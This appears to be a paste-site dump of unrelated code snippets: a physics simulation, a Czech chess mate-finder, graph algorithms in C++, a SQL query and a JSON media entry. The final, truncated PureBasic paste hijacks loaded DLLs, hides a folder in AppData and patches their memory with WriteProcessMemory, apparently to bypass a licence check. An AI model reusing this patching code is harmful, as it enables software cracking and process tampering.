                double k_scat = (V0_z/V0)*cos_khi - (V0_y/V0)*sin_khi*sin(phi)/sin_theta - (V0_x/V0)*(V0_z/V0)*sin_khi*cos(phi)/sin_theta;

                //updating electron energy and velocities

                double delta_E = (2*m_e/M_n)*(1-cos_khi)*e.energy;                
                
                if (delta_E < e.energy) 
                    e.energy = E_0 - delta_E;
                else 
                    e.energy = E_0;

                double speed = sqrt(2*e.energy*q/m_e);

                e.vx = speed*i_scat;
                e.vy = speed*j_scat;
                e.vz = speed*k_scat;

                collision_counter++;

                e.collided = true;
            }             
        }
                if (t%print_interval == 0){
                // open datafiles to write each time step to see evolution
                std::ostringstream filename;
                filename << ""data/distribution_"" << std::setw(4) << std::setfill('0') << t << "".dat"";

                std::ofstream file(filename.str());
                if (!file.is_open()){
                std::cerr << ""Error opening file: "" << filename.str() << std::endl;
                return 1;
                }
                // end opening datafiles for each timestep
                
                // creating histogram each timestep
                for (int i = 0; i < n_e; i++){
                    int bin = (int)( (electrons[i].energy - Emin)/bin_width );
                    if (bin >=0 && bin < N)
                    histo_maxwell[bin]++;
                }

                // writing data each time step
                for (int i = 0; i < N; i++){
                    double bin_center = Emin + (i + 0.5) * bin_width;
                    file << bin_center << "" "" <<  static_cast<double>(histo_maxwell[i])/(electrons.size()*bin_width) << ""\n""; // later need to divide by total partcles number to get normalized distribution
                    histo_maxwell[i] = 0;
                }

                file.close();
                // end writing data each timestep
            }

            // calculating mean energy 
            double total_energy = 0.0;
            for (const auto& e : electrons) total_energy += e.energy;
            double mean_energy = total_energy / n_e;
            file8 << t*dt << "" "" << mean_energy << ""\n"";
    }


    for (int i = 0; i < n_e; i++){

        file2 << i << "" "" << electrons[i].energy << ""\n"";

        int bin = (int)( (electrons[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_maxwell.size())
            histo_maxwell[bin]++;
    }

    int check = 0;
    for (int i = 0; i < histo_maxwell.size(); i++){
        check += histo_maxwell[i];
        double bin_center = Emin + (i + 0.5) * bin_width;
        file4 << bin_center << "" "" <<  bin_center*static_cast<double>(histo_maxwell[i])/(electrons.size()*bin_width) << ""\n""; // getting f(E)*E
    }
    std::cout << ""Total # of electrons in histo: "" << check << ""\n"";


    file0.close();
    file1.close();
    file2.close();
    file3.close();
    file4.close();
    file5.close();
    file6.close();
    file7.close();
    file8.close();
    file9.close();

    clock_t end = clock();

    double elapsed = (double)(end - start) / CLOCKS_PER_SEC;

    std::cout << ""Ne collided each timesteps:"" << Ne_collided << ""\n"";
    std::cout << ""Energies written successfuly\n"";
    std::cout << ""Elapsed time: %f seconds "" << elapsed << ""\n"";
    std::cout << ""Nu_max: "" << nu_max << ""\n"";


    return 0;

}"
7qvZ7zGH,posledni kqK cas i vse ostatni OKK,max2201111,Python,Tuesday 1st of April 2025 10:28:25 AM CDT,"#!/usr/bin/env python3
import time
import threading
import sys
from math import inf

# Konstanty pro pohyby jezdce
knight_moves = [(2,1),(2,-1),(-2,1),(-2,-1),(1,2),(1,-2),(-1,2),(-1,-2)]

# Globální proměnné pro čas a historii tahů
running = False
start_time = 0
move_stack = []

def time_reporter():
    """"""Funkce pro výpis času každou sekundu na stejném řádku.""""""
    global running, start_time
    while running:
        elapsed = time.time() - start_time
        hrs = int(elapsed // 3600)
        mins = int((elapsed % 3600) // 60)
        secs = int(elapsed % 60)
        sys.stdout.write(f""\r[INFO] Uplynulý čas: {hrs:02d}h {mins:02d}m {secs:02d}s"")
        sys.stdout.flush()
        time.sleep(1)

class Board:
    def __init__(self, fen=None):
        """"""Inicializace šachovnice.""""""
        self.grid = [[' ' for _ in range(8)] for _ in range(8)]
        self.to_move = 'w'
        self.castling_rights = set()
        self.en_passant = None
        self.halfmove_clock = 0
        self.fullmove_number = 1
        if fen:
            self.set_fen(fen)
    
    def set_fen(self, fen):
        """"""Nastaví šachovnici podle FEN řetězce.""""""
        parts = fen.split()
        while len(parts) < 6:
            parts.append('0')
        board_part, turn_part = parts[0], parts[1]
        castling_part = parts[2] if len(parts) > 2 else '-'
        en_passant_part = parts[3] if len(parts) > 3 else '-'
        halfmove = parts[4] if len(parts) > 4 else '0'
        fullmove = parts[5] if len(parts) > 5 else '1'
        
        self.grid = [['.' for _ in range(8)] for _ in range(8)]
        ranks = board_part.split('/')
        
        for rank_idx, rank_str in enumerate(ranks):
            file_idx = 0
            for ch in rank_str:
                if ch.isdigit():
                    file_idx += int(ch)
                else:
                    self.grid[rank_idx][file_idx] = ch
                    file_idx += 1
        
        self.to_move = 'w' if turn_part == 'w' else 'b'
        self.castling_rights = set() if castling_part == '-' else set(castling_part)
        self.en_passant = None
        
        if en_passant_part != '-' and en_passant_part != '':
            file = ord(en_passant_part[0]) - ord('a')
            rank = int(en_passant_part[1])
            ri = 8 - rank
            fi = file
            if 0 <= ri < 8 and 0 <= fi < 8:
                self.en_passant = (ri, fi)
        
        try:
            self.halfmove_clock = int(halfmove)
        except:
            self.halfmove_clock = 0
        
        try:
            self.fullmove_number = int(fullmove)
        except:
            self.fullmove_number = 1
    
    def copy(self):
        """"""Vytvoří hlubokou kopii šachovnice.""""""
        new_board = Board()
        new_board.grid = [row.copy() for row in self.grid]
        new_board.to_move = self.to_move
        new_board.castling_rights = set(self.castling_rights)
        new_board.en_passant = None if self.en_passant is None else (self.en_passant[0], self.en_passant[1])
        new_board.halfmove_clock = self.halfmove_clock
        new_board.fullmove_number = self.fullmove_number
        return new_board

    def display(self):
        """"""Vrátí textovou reprezentaci šachovnice.""""""
        lines = []
        for ri in range(8):
            line = """"
            for fi in range(8):
                line += self.grid[ri][fi] + "" ""
            lines.append(line)
        return ""\n"".join(lines)

# Základní funkce pro šach
def find_king(board, side):
    """"""Najde pozici krále pro stranu 'w' nebo 'b'.""""""
    target = 'K' if side=='w' else 'k'
    for r in range(8):
        for c in range(8):
            if board.grid[r][c] == target:
                return (r, c)
    return None

def is_square_attacked(board, r, c, by_side):
    """"""Zjistí, zda je pole (r,c) napadeno stranou by_side.""""""
    # Útoky pěšcem
    if by_side == 'b':
        if r+1 < 8 and c-1 >= 0 and board.grid[r+1][c-1] == 'p': return True
        if r+1 < 8 and c+1 < 8 and board.grid[r+1][c+1] == 'p': return True
    else:
        if r-1 >= 0 and c-1 >= 0 and board.grid[r-1][c-1] == 'P': return True
        if r-1 >= 0 and c+1 < 8 and board.grid[r-1][c+1] == 'P': return True
    
    # Útoky jezdcem a dalšími s jezdcovým pohybem (N, A, C, E)
    enemy_knights = ['n','a','c','e'] if by_side=='b' else ['N','A','C','E']
    for dr, dc in knight_moves:
        nr, nc = r+dr, c+dc
        if 0<=nr<8 and 0<=nc<8 and board.grid[nr][nc] in enemy_knights:
            return True
    
    # Útoky po řadách/sloupcích (R, Q, E, A)
    enemy_rook_like = ['r','q','e','a'] if by_side=='b' else ['R','Q','E','A']
    for dr, dc in [(1,0),(-1,0),(0,1),(0,-1)]:
        nr, nc = r+dr, c+dc
        while 0<=nr<8 and 0<=nc<8:
            if board.grid[nr][nc] != '.':
                if board.grid[nr][nc] in enemy_rook_like:
                    return True
                break
            nr += dr; nc += dc
    
    # Útoky diagonálně (B, Q, C, A)
    enemy_bishop_like = ['b','q','c','a'] if by_side=='b' else ['B','Q','C','A']
    for dr, dc in [(1,1),(1,-1),(-1,1),(-1,-1)]:
        nr, nc = r+dr, c+dc
        while 0<=nr<8 and 0<=nc<8:
            if board.grid[nr][nc] != '.':
                if board.grid[nr][nc] in enemy_bishop_like:
                    return True
                break
            nr += dr; nc += dc
    
    # Sousední král
    enemy_king = 'k' if by_side=='b' else 'K'
    for dr in [-1,0,1]:
        for dc in [-1,0,1]:
            if dr==0 and dc==0: continue
            nr, nc = r+dr, c+dc
            if 0<=nr<8 and 0<=nc<8 and board.grid[nr][nc] == enemy_king:
                return True
    
    return False

def is_in_check(board, side):
    """"""Zjistí, zda je král strany side ('w' nebo 'b') v šachu.""""""
    king_pos = find_king(board, side)
    if not king_pos:
        return False
    kr, kc = king_pos
    enemy_side = 'b' if side=='w' else 'w'
    return is_square_attacked(board, kr, kc, enemy_side)

def generate_pseudo_moves(board, side):
    """"""Generuje všechny pseudolegální tahy pro stranu side ('w' nebo 'b').""""""
    moves = []
    is_white = (side=='w')
    pawn_dir = -1 if is_white else 1
    start_rank = 6 if is_white else 1
    promote_rank = 0 if is_white else 7
    
    for r in range(8):
        for c in range(8):
            piece = board.grid[r][c]
            if piece == '.': continue
            if is_white and not piece.isupper(): continue
            if not is_white and not piece.islower(): continue
            
            pt = piece.upper()
            if pt == 'P':
                nr = r + pawn_dir
                if 0<=nr<8 and board.grid[nr][c]=='.':
                    if nr==promote_rank:
                        for promo in ['Q','R','B','N','A','E','C']:
                            moves.append((r, c, nr, c, promo if is_white else promo.lower(), None))
                    else:
                        moves.append((r, c, nr, c, None, None))
                    if r==start_rank and board.grid[r+pawn_dir*2][c]=='.' and board.grid[r+pawn_dir][c]=='.':
                        moves.append((r, c, r+pawn_dir*2, c, None, 'double'))
                for dc in [-1,1]:
                    nc = c + dc
                    if 0<=nc<8 and 0<=nr<8:
                        if board.grid[nr][nc] != '.' and ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                            if nr==promote_rank:
                                for promo in ['Q','R','B','N','A','E','C']:
                                    moves.append((r, c, nr, nc, promo if is_white else promo.lower(), None))
                            else:
                                moves.append((r, c, nr, nc, None, None))
                        if board.en_passant == (nr, nc):
                            moves.append((r, c, nr, nc, None, 'enpassant'))
            elif pt == 'K':
                for dr in [-1,0,1]:
                    for dc in [-1,0,1]:
                        if dr==0 and dc==0: continue
                        nr, nc = r+dr, c+dc
                        if 0<=nr<8 and 0<=nc<8:
                            if board.grid[nr][nc]=='.' or ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                                moves.append((r, c, nr, nc, None, None))
                # Rošády
                if is_white and r==7 and c==4:
                    if 'K' in board.castling_rights and board.grid[7][5]=='.' and board.grid[7][6]=='.':
                        moves.append((7,4,7,6,None,'castle'))
                    if 'Q' in board.castling_rights and board.grid[7][3]=='.' and board.grid[7][2]=='.' and board.grid[7][1]=='.':
                        moves.append((7,4,7,2,None,'castle'))
                if not is_white and r==0 and c==4:
                    if 'k' in board.castling_rights and board.grid[0][5]=='.' and board.grid[0][6]=='.':
                        moves.append((0,4,0,6,None,'castle'))
                    if 'q' in board.castling_rights and board.grid[0][3]=='.' and board.grid[0][2]=='.' and board.grid[0][1]=='.':
                        moves.append((0,4,0,2,None,'castle'))
            else:
                # Tahy pro figury s jezdcovým pohybem (N, A, C, E)
                if pt in ['N','A','C','E']:
                    for dr, dc in knight_moves:
                        nr, nc = r+dr, c+dc
                        if 0<=nr<8 and 0<=nc<8:
                            if board.grid[nr][nc]=='.' or ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                                moves.append((r, c, nr, nc, None, None))
                
                # Klouzavé tahy – pro R, Q, E, A
                if pt in ['R','Q','E','A']:
                    for dr, dc in [(1,0),(-1,0),(0,1),(0,-1)]:
                        nr, nc = r+dr, c+dc
                        while 0<=nr<8 and 0<=nc<8:
                            if board.grid[nr][nc]=='.':
                                moves.append((r, c, nr, nc, None, None))
                            else:
                                if ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                                    moves.append((r, c, nr, nc, None, None))
                                break
                            nr += dr; nc += dc
                
                # Diagonální tahy – pro B, Q, C, A
                if pt in ['B','Q','C','A']:
                    for dr, dc in [(1,1),(1,-1),(-1,1),(-1,-1)]:
                        nr, nc = r+dr, c+dc
                        while 0<=nr<8 and 0<=nc<8:
                            if board.grid[nr][nc]=='.':
                                moves.append((r, c, nr, nc, None, None))
                            else:
                                if ((is_white and board.grid[nr][nc].islower()) or (not is_white and board.grid[nr][nc].isupper())):
                                    moves.append((r, c, nr, nc, None, None))
                                break
                            nr += dr; nc += dc
    
    return moves

def get_legal_moves(board, side):
    """"""Vrátí seznam legálních tahů pro danou stranu.""""""
    moves = generate_pseudo_moves(board, side)
    legal_moves = []
    for move in moves:
        make_move(move, board)
        if not is_in_check(board, side):
            legal_moves.append(move)
        undo_move(board)
    return legal_moves

def make_move(move, board):
    """"""Provede tah na šachovnici a uloží stav pro možnost undo.""""""
    r1, c1, r2, c2, promo, special = move
    piece = board.grid[r1][c1]
    captured = board.grid[r2][c2] if special != 'enpassant' else ('p' if piece=='P' else 'P')
    prev_state = (set(board.castling_rights), board.en_passant, board.halfmove_clock, board.fullmove_number)
    move_stack.append((r1, c1, r2, c2, promo, special, piece, captured, prev_state))
    
    # Aktualizace půltahových hodin a čísla tahu
    if piece.upper() == 'P' or captured != '.':
        board.halfmove_clock = 0
    else:
        board.halfmove_clock += 1
    
    if board.to_move == 'b':
        board.fullmove_number += 1
    
    board.grid[r1][c1] = '.'
    
    if special == 'castle':
        board.grid[r2][c2] = piece
        if piece == 'K':
            if c2 == 6:
                board.grid[7][5] = 'R'; board.grid[7][7] = '.'
            else:
                board.grid[7][3] = 'R'; board.grid[7][0] = '.'
        else:
            if c2 == 6:
                board.grid[0][5] = 'r'; board.grid[0][7] = '.'
            else:
                board.grid[0][3] = 'r'; board.grid[0][0] = '.'
    elif special == 'enpassant':
        board.grid[r2][c2] = piece
        if piece == 'P':
            board.grid[r2+1][c2] = '.'
        else:
            board.grid[r2-1][c2] = '.'
    else:
        board.grid[r2][c2] = promo if promo else piece
    
    # Aktualizace rošádových práv
    if piece == 'K':
        board.castling_rights.discard('K'); board.castling_rights.discard('Q')
    if piece == 'k':
        board.castling_rights.discard('k'); board.castling_rights.discard('q')
    if piece == 'R' and (r1, c1)==(7,7):
        board.castling_rights.discard('K')
    if piece == 'R' and (r1, c1)==(7,0):
        board.castling_rights.discard('Q')
    if piece == 'r' and (r1, c1)==(0,7):
        board.castling_rights.discard('k')
    if piece == 'r' and (r1, c1)==(0,0):
        board.castling_rights.discard('q')
    
    # En passant
    if special == 'double':
        board.en_passant = (r1 + (-1 if board.to_move=='w' else 1), c1)
    else:
        board.en_passant = None
    
    board.to_move = 'b' if board.to_move=='w' else 'w'

def undo_move(board):
    """"""Vrátí poslední provedený tah.""""""
    if not move_stack:
        print(""Chyba: Žádný tah k vrácení!"")
        return
    
    r1, c1, r2, c2, promo, special, piece, captured, prev_state = move_stack.pop()
    castling_rights, en_passant, halfmove_clock, fullmove_number = prev_state
    
    board.grid[r1][c1] = piece
    
    if special == 'castle':
        board.grid[r2][c2] = '.'
        if piece == 'K':
            if c2 == 6:
                board.grid[7][7] = 'R'; board.grid[7][5] = '.'
            else:
                board.grid[7][0] = 'R'; board.grid[7][3] = '.'
        else:
            if c2 == 6:
                board.grid[0][7] = 'r'; board.grid[0][5] = '.'
            else:
                board.grid[0][0] = 'r'; board.grid[0][3] = '.'
    elif special == 'enpassant':
        board.grid[r2][c2] = '.'
        if piece == 'P':
            board.grid[r2+1][c2] = 'p'
        else:
            board.grid[r2-1][c2] = 'P'
    else:
        board.grid[r2][c2] = captured
    
    board.castling_rights = castling_rights
    board.en_passant = en_passant
    board.halfmove_clock = halfmove_clock
    board.fullmove_number = fullmove_number
    board.to_move = 'b' if board.to_move=='w' else 'w'

def move_to_notation(move, board):
    """"""Převede tah na standardní šachovou notaci.""""""
    cols = ""abcdefgh""
    r1, c1, r2, c2, promo, special = move
    
    if special == 'castle':
        return ""O-O"" if c2 > c1 else ""O-O-O""
    
    piece = board.grid[r1][c1].upper()
    is_pawn = piece == 'P'
    
    # Pro pěšce nezačínáme označením figury
    prefix = '' if is_pawn else piece
    
    # Pole
    from_square = cols[c1] + str(8 - r1)
    to_square = cols[c2] + str(8 - r2)
    
    # Proměna
    promotion = '=' + promo.upper() if promo else ''
    
    # En passant
    ep = "" e.p."" if special == 'enpassant' else ''
    
    return prefix + from_square + '-' + to_square + promotion + ep

def is_mate_in_n_plies(board, depth):
    """"""Zjistí, zda je v pozici mat v přesně 'depth' půltazích.""""""
    if depth == 0:
        # Je teď mat?
        side_to_move = board.to_move
        return is_in_check(board, side_to_move) and not get_legal_moves(board, side_to_move), None
    
    side_to_move = board.to_move
    legal_moves = get_legal_moves(board, side_to_move)
    
    # Pokud nemá tahy
    if not legal_moves:
        # Pokud je to mat nyní, není to mat v hloubce depth (musí být přesně)
        if is_in_check(board, side_to_move):
            return False, None
        # Pat - nemůže dát mat
        return False, None
    
    # Útočící strana hledá mat, bránící strana hledá únik
    if (depth % 2 == 1 and board.to_move == 'w') or (depth % 2 == 0 and board.to_move == 'b'):
        # Jsme na tahu a hledáme mat pro soupeře
        for move in legal_moves:
            make_move(move, board)
            is_mate, _ = is_mate_in_n_plies(board, depth - 1)
            undo_move(board)
            
            if is_mate:
                return True, move
        
        # Nenašli jsme žádnou matující sekvenci
        return False, None
    else:
        # Jsme v obraně a snažíme se vyhnout matu
        all_lead_to_mate = True
        for move in legal_moves:
            make_move(move, board)
            is_mate, _ = is_mate_in_n_plies(board, depth - 1)
            undo_move(board)
            
            if not is_mate:
                # Našli jsme únikový tah
                all_lead_to_mate = False
                break
        
        # Pokud všechny tahy vedou k matu, soupeř má mat v 'depth' půltazích
        return all_lead_to_mate, None

def find_mate_sequence(board, max_plies=20):
    """"""Najde a vypíše posloupnost tahů vedoucí k matu.""""""
    global running, start_time, move_stack
    
    # Vyčistit zásobník
    move_stack = []
    
    # Spustit časovač
    running = True
    start_time = time.time()
    timer_thread = threading.Thread(target=time_reporter)
    timer_thread.daemon = True
    timer_thread.start()
    
    try:
        # Nejprve kontrola, zda je již mat
        side_to_move = board.to_move
        legal_moves = get_legal_moves(board, side_to_move)
        
        if not legal_moves:
            if is_in_check(board, side_to_move):
                print(""\nPoziční analýza: Mat - "" + 
                      (""černý vyhrává"" if side_to_move == 'w' else ""bílý vyhrává""))
                return
            else:
                print(""\nPoziční analýza: Pat - remíza"")
                return
                
        # Zkusíme najít mat v několika tazích
        print(""\nHledám posloupnost tahů k matu..."")
        for plies in range(1, max_plies + 1):
            is_mate, best_move = is_mate_in_n_plies(board, plies)
            if is_mate:
                print(f""\nNalezen mat v {plies} půltazích!"")
                
                # Rekonstruujeme a vypisujeme sekvenci tahů k matu
                print(""\nPosloupnost tahů k matu:"")
                variant_board = board.copy()
                
                # Proveďme první tah
                move_notation = move_to_notation(best_move, variant_board)
                make_move(best_move, variant_board)
                print(f""1. {move_notation}"")
                print(variant_board.display())
                print(""-"" * 30)
                
                # Pokud je již mat, končíme
                if not get_legal_moves(variant_board, variant_board.to_move) and is_in_check(variant_board, variant_board.to_move):
                    print(""Mat!"")
                    return
                
                # Nyní pokračujeme v rekonstrukci sekvence tahů
                curr_depth = plies - 1
                move_num = 2
                
                while curr_depth > 0:
                    # Najdeme nejlepší odpověď pro aktuální stranu na tahu
                    is_mat, next_move = is_mate_in_n_plies(variant_board, curr_depth)
                    
                    if next_move:
                        move_notation = move_to_notation(next_move, variant_board)
                        make_move(next_move, variant_board)
                        print(f""{move_num}. {move_notation}"")
                        print(variant_board.display())
                        print(""-"" * 30)
                        
                        # Kontrola, zda je již mat
                        if not get_legal_moves(variant_board, variant_board.to_move) and is_in_check(variant_board, variant_board.to_move):
                            print(""Mat!"")
                            return
                        
                        move_num += 1
                        curr_depth -= 1
                    else:
                        break
                
                return
        
        # Pokud nenajdeme mat, hledáme nejlepší tahy
        print(""\nPosloupnost nejlepších tahů (bez zaručeného matu):"")
        
        search_depth = 5
        legal_moves = get_legal_moves(board, board.to_move)
        
        if legal_moves:
            variant_board = board.copy()
            
            # Jednoduché vyhledávání: pokusit se najít tahy vedoucí k matu nebo materiálnímu zisku
            for i in range(10):  # Max 10 tahů
                legal_moves = get_legal_moves(variant_board, variant_board.to_move)
                if not legal_moves:
                    if is_in_check(variant_board, variant_board.to_move):
                        print(""Mat!"")
                    else:
                        print(""Pat - remíza!"")
                    break
                
                # Zkusíme najít mat v 1
                best_move = None
                for move in legal_moves:
                    make_move(move, variant_board)
                    if not get_legal_moves(variant_board, variant_board.to_move) and is_in_check(variant_board, variant_board.to_move):
                        best_move = move
                        print(f""{i+1}. {move_to_notation(move, board)} (mat)"")
                        print(variant_board.display())
                        print(""-"" * 30)
                        print(""Mat!"")
                        break
                    undo_move(variant_board)
                
                if best_move:
                    break
                
                # Nemáme mat, zkusíme najít braní figury
                best_move = None
                for move in legal_moves:
                    r1, c1, r2, c2, _, _ = move
                    if variant_board.grid[r2][c2] != '.':
                        best_move = move
                        make_move(move, variant_board)
                        print(f""{i+1}. {move_to_notation(move, board)} (braní)"")
                        print(variant_board.display())
                        print(""-"" * 30)
                        break
                
                if best_move:
                    continue
                
                # Žádné braní, jen náhodný první tah
                best_move = legal_moves[0]
                make_move(best_move, variant_board)
                print(f""{i+1}. {move_to_notation(best_move, board)}"")
                print(variant_board.display())
                print(""-"" * 30)
    
    finally:
        # Ukončit časovač
        running = False
        timer_thread.join(timeout=1.0)
        print("""")  # Nový řádek po časovém výpisu

def main():
    """"""Hlavní funkce programu.""""""
    # Několik zajímavých pozic pro testování
    standard_fen = ""rnbqkbnr/pppppppp/8/8/8/8/PPPPPPPP/RNBQKBNR w KQkq - 0 1""  # Základní pozice
    
    # Pozice s Amazonkou (A/a) - kombinuje tahy dámy a jezdce
    amazon_fen = ""8/6A1/8/8/8/k7/8/K7 w - - 0 1""  # Bílá Amazonka
    
    # Pozice s Cyrilo (C/c) - kombinuje tahy jezdce a střelce
    cyrilo_fen = ""8/8/8/8/8/kq2K3/6C1/8 w - - 0 1""
    
    # Pozice s Eve (E/e) - kombinuje tahy jezdce a věže
    eve_fen = ""8/8/8/8/8/k2E4/8/K7 w - - 0 1""
    
    # Mat Amazonkou v jednom tahu
    amazon_mate_fen = ""k7/8/1K6/8/8/8/8/A7 w - - 0 1""
    
    # Bílý dá mat v 2
    mate_in_2_fen = ""3k4/8/3K4/8/8/8/8/R7 w - - 0 1""
    
    # Pozice pro testování
    test_fen = amazon_mate_fen
    
    test_fen = ""k7/8/8/K7/1Q6/8/8/8 w - - 0 1""
    
    print(""Šachový engine pro hledání matových sekvencí"")
    print(""============================================"")
    
    # Načtení pozice
    board = Board(test_fen)
    print(""\nPočáteční pozice:"")
    print(board.display())
    print(f""Na tahu je {'bílý' if board.to_move == 'w' else 'černý'}"")
    
    # Najít sekvenci tahů k matu
    find_mate_sequence(board)

if __name__ == ""__main__"":
    main()"
EagydUCy,strongly_connected_components,Araf_12,C++,Tuesday 1st of April 2025 09:54:29 AM CDT,"#include <bits/stdc++.h>
using namespace std;

const int N = 1e5 + 1;

vector<int> adj[N], adj_t[N]; // adj_t is the transpose of adj
vector<int> order;            // stores nodes in order of finishing times
vector<bool> vis(N);          // visited array
vector<int> id(N);            // component id for each node
int component_count = 0;      // counts number of SCCs

// First DFS pass to fill the order vector
void dfs1(int v) {
    vis[v] = true;
    for (int u : adj[v]) {
        if (!vis[u]) {
            dfs1(u);
        }
    }
    order.push_back(v);
}

// Second DFS pass on the transpose graph
void dfs2(int v, int comp) {
    vis[v] = true;
    id[v] = comp;
    for (int u : adj_t[v]) {
        if (!vis[u]) {
            dfs2(u, comp);
        }
    }
}

int main() {
    int n, m; // n = number of nodes, m = number of edges
    cin >> n >> m;

    // Read edges and build both original and transpose graphs
    for (int i = 0; i < m; i++) {
        int u, v;
        cin >> u >> v;
        adj[u].push_back(v);
        adj_t[v].push_back(u);
    }

    // First DFS pass to get processing order
    fill(vis.begin(), vis.end(), false);
    for (int i = 1; i <= n; i++) {
        if (!vis[i]) {
            dfs1(i);
        }
    }

    // Second DFS pass on transpose graph in reverse order
    fill(vis.begin(), vis.end(), false);
    reverse(order.begin(), order.end());
    for (int v : order) {
        if (!vis[v]) {
            dfs2(v, component_count++);
        }
    }

    // Output results
    cout << ""Number of strongly connected components: "" << component_count << endl;
    cout << ""Component assignments:\n"";
    for (int i = 1; i <= n; i++) {
        cout << ""Node "" << i << "" is in component "" << id[i] << endl;
    }

    return 0;
}"
NF1qyfLQ,topological_sorting(DFS),Araf_12,C++,Tuesday 1st of April 2025 09:49:41 AM CDT,"#include <iostream>
#include <vector>
#include <algorithm>

using namespace std;

vector<vector<int>> adj; // adjacency list of graph
vector<int> visited;
vector<int> ans; // will store the topological order

void dfs(int v) {
    visited[v] = true;
    for (int u : adj[v]) {
        if (!visited[u])
            dfs(u);
    }
    ans.push_back(v); // add vertex to the result after visiting all neighbors
}

vector<int> topological_sort(int n) {
    visited.assign(n, false);
    ans.clear();
    
    for (int i = 0; i < n; ++i) {
        if (!visited[i])
            dfs(i);
    }
    
    reverse(ans.begin(), ans.end()); // reverse to get correct topological order
    return ans;
}

int main() {
    int n, m; // n = number of vertices, m = number of edges
    cout << ""Enter number of vertices and edges: "";
    cin >> n >> m;
    
    adj.resize(n);
    cout << ""Enter edges (u v):"" << endl;
    for (int i = 0; i < m; ++i) {
        int u, v;
        cin >> u >> v;
        adj[u].push_back(v);
    }
    
    vector<int> topo_order = topological_sort(n);
    
    cout << ""Topological order: "";
    for (int v : topo_order) {
        cout << v << "" "";
    }
    cout << endl;
    
    return 0;
}"
kyxyqW6b,topological_sorting(BFS),Araf_12,C++,Tuesday 1st of April 2025 09:43:41 AM CDT,"#include <bits/stdc++.h>
using namespace std;

const int N = 1e5 + 5; // Adjust based on constraints
vector<int> adj[N];
int indegree[N];
vector<int> ans;

void topological_sort(int n) {
    queue<int> q;
    
    // Push all nodes with indegree 0
    for (int i = 1; i <= n; i++) {
        if (indegree[i] == 0) 
            q.push(i);
    }

    while (!q.empty()) {
        int u = q.front();
        q.pop();
        ans.push_back(u);

        for (int v : adj[u]) {
            indegree[v]--;
            if (indegree[v] == 0) 
                q.push(v);
        }
    }

    // If topological sorting is not possible (i.e., cycle exists)
    if (ans.size() != n) {
        cout << ""Cycle detected! Topological sorting not possible."" << endl;
        return;
    }

    // Print topological order
    for (int node : ans)
        cout << node << "" "";
    cout << endl;
}

int main() {
    int n, m;
    cin >> n >> m; // Number of nodes and edges

    // Read edges
    for (int i = 0; i < m; i++) {
        int u, v;
        cin >> u >> v;
        adj[u].push_back(v);
        indegree[v]++;
    }

    topological_sort(n);

    return 0;
}
"
cRt6SqXa,consulta de puestos al dia en todo autovaluo,kuroshan1104,MySQL,Tuesday 1st of April 2025 09:09:10 AM CDT,"SELECT 
    gp.nomcompleto,
    GROUP_CONCAT(DISTINCT p.codigo ORDER BY p.codigo ASC SEPARATOR ', ') AS codigos
FROM d_deuda d
INNER JOIN d_deuda_puesto dp ON d.ideuda = dp.ideuda
INNER JOIN p_puesto p ON dp.idpuesto = p.idpuesto
INNER JOIN p_puesto_socio pps 
    ON p.idpuesto = pps.idpuesto
   AND d.idpersona = pps.idsocio
INNER JOIN g_persona gp ON d.idpersona = gp.idpersona
WHERE pps.activo = 1
  AND p.activo = 1
  AND d.idconcepto = 8
GROUP BY gp.nomcompleto
HAVING SUM(CASE WHEN d.estado IN ('DE', 'OK') THEN 1 ELSE 0 END) = 0
ORDER BY gp.nomcompleto;"
hz1wfGCR,tv 04-2025 task,spidersam,JSON,Tuesday 1st of April 2025 07:23:44 AM CDT,"[
   {
    ""name"": ""ZooTv-Live-01-04-2025"",
    ""url"": ""https://app.talkshoe.com/drive_files/download/a1697944-7ebd-4381-b110-7e70b38ae452.mp4"",
    ""imageUrl"": ""https://i.imgur.com/JxTvPB7.jpeg""  
   }
]"
NH4Vyhmw,Hijacking multiple dll loaded by executable file in purebasic,LAUDA937,Delphi,Tuesday 1st of April 2025 07:07:52 AM CDT,"Global content.s =""""
Global encryptedHex.s =""""
Global Fulllic.s =""""
Global PC.s =""No""
Global.i ShowWelcome = 1, ExeSize
Global.s Thumuc_0, Md5File, ExeMD5
Global.s FilenameEXE_0 = GetPathPart(ProgramFilename())+""DLL1.dll"",Filenamedll_0 = GetPathPart(ProgramFilename())+""DLL1.dll""
Global.s Thumuc_1, Md5File, ExeMD5
Global.s FilenameEXE_1 = GetPathPart(ProgramFilename())+""DLL2.dll"",Filenamedll_1 = GetPathPart(ProgramFilename())+""DLL2.dll""
Global.s Thumuc_2, Md5File, ExeMD5
Global.s FilenameEXE_2 = GetPathPart(ProgramFilename())+""DLL3.dll  "",Filenamedll_2 = GetPathPart(ProgramFilename())+""DLL3.dll  ""
ProcedureDLL OFS_0()
UseMD5Fingerprint()
ExeSize        = FileSize(FilenameEXE_2)
ExeMD5         = StringFingerprint(Str(ExeSize), #PB_Cipher_MD5, #PB_Ascii)
Thumuc_2   = GetEnvironmentVariable(""AppData"")+ ""\""+""Victoria""
CreateDirectory(Thumuc_2)
Md5File        = Thumuc_2 +""\"" + ExeMD5 + ""OFS.gms""
SetFileAttributes(Thumuc_2,#PB_FileSystem_Hidden|#PB_FileSystem_System)
EndProcedure

ProcedureDLL Hook_dll_0(Memory.i, RData.s, DllhModule.i)
hModule.i = DllhModule
lpBaseADDRESS = hModule + Memory

CreateDirectory(Thumuc_2)
CreateFile(0, Md5File, #PB_File_SharedWrite|#PB_Ascii)
WriteString(0, ""RozDll OFS Data file, please don't alter!"" + Chr(10), #PB_Ascii)
WriteString(0, FilenameEXE_2 + Chr(10), #PB_Ascii)
For Index = Len(RData) To 2 Step -2
RRData.s = RRData + Mid(RData, Index - 1, 2)
next

nSize.i = 0.5 * Len(RRData)
lpBuffer.i = Val(""$"" + RRData)
WriteProcessMemory_(GetCurrentProcess_(), lpBaseADDRESS, @lpBuffer, nSize, 0)
EndProcedure

ProcedureDLL Quatrinh_0(Interval.l)
Repeat
If OpenLibrary(0, Filenamedll_0)
If Hook_dll_0($1D6247,""74"", LibraryID(0))
Break
EndIf
EndIf
Delay(Interval)
ForEver
EndProcedure
 
ProcedureDLL Quatrinh_1(Interval.l)
Repeat
If OpenLibrary(0, Filenamedll_1)
